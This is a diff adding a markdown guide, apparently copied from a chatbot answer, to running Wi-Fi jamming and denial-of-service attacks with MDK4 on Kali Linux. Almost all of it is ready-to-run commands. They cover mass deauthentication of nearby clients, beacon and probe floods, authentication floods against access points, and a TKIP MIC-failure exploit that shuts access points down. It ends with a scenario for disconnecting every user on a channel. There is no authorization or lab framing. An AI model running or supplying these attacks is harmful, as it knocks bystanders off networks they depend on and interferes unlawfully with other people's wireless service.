@@ -1,0 +1,118 @@
+✅ Step-by-Step: Using MDK4 in Kali Linux
+🔧 1. Install MDK4
+MDK4 is not pre-installed in Kali. Use the following commands:
+
+bash
+Copy
+Edit
+sudo apt update
+sudo apt install mdk4
+To verify installation:
+
+bash
+Copy
+Edit
+mdk4 --help
+📶 2. Put Wi-Fi Adapter in Monitor Mode
+You need a Wi-Fi card that supports monitor mode and packet injection (e.g., Alfa AWUS036NHA).
+
+bash
+Copy
+Edit
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+This creates an interface like wlan0mon. Use this in all further commands.
+
+🚨 3. Basic Attack Modes in MDK4
+Here are the most common modes of jamming:
+
+▶️ A. Deauthentication Attack (Mode d) – Disconnect Devices
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon d
+This sends deauth packets to all nearby clients.
+
+👉 More specific:
+
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon d -c [channel] -t [target MAC]
+Example:
+
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon d -c 6 -t AA:BB:CC:DD:EE:FF
+▶️ B. Beacon Flood Attack (Mode b) – Fake Networks Flood
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon b -f fake_aps.txt
+Content of fake_aps.txt:
+
+objectivec
+Copy
+Edit
+Free_WiFi
+Hacked_Network
+Internet_404
+NSA_Spy_AP
+Creates dozens of fake SSIDs to confuse nearby users or devices.
+
+▶️ C. Authentication DoS (Mode a) – Spam APs with Auth Requests
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon a -a [BSSID] -i [SSID]
+Floods the target access point with bogus authentication requests.
+
+▶️ D. Probe Request Flood (Mode p) – Spam with device probe requests
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon p
+Simulates devices constantly probing for networks.
+
+▶️ E. Michael MIC Failure Exploit (Mode m) – Exploit TKIP vulnerability
+bash
+Copy
+Edit
+sudo mdk4 wlan0mon m -t [target MAC] -c [channel]
+Causes AP to shut down if repeated MIC failures occur (WPA1/WPA2-TKIP only).
+
+❌ 4. Stop Monitor Mode
+When done, restore normal network:
+
+bash
+Copy
+Edit
+sudo airmon-ng stop wlan0mon
+sudo systemctl restart NetworkManager
+📁 Example Attack Scenario
+Goal: Disconnect all users from Wi-Fi Channel 6
+bash
+Copy
+Edit
+sudo airmon-ng start wlan0
+sudo mdk4 wlan0mon d -c 6
+Let it run for ~30 seconds, then stop with Ctrl + C.
+
+📄 Useful Tips
+Tool	Purpose
+airodump-ng	Scan for nearby Wi-Fi networks and channels
+airmon-ng	Switch modes on interfaces
+mdk4	Execute jamming/deauth attacks
+
+🛠 Optional: Compile Latest MDK4 from Source
+If apt version is buggy:
+
+bash
+Copy
+Edit
+sudo apt install git build-essential libpcap-dev
+git clone https://github.com/aircrack-ng/mdk4.git
+cd mdk4
+make
+sudo make install
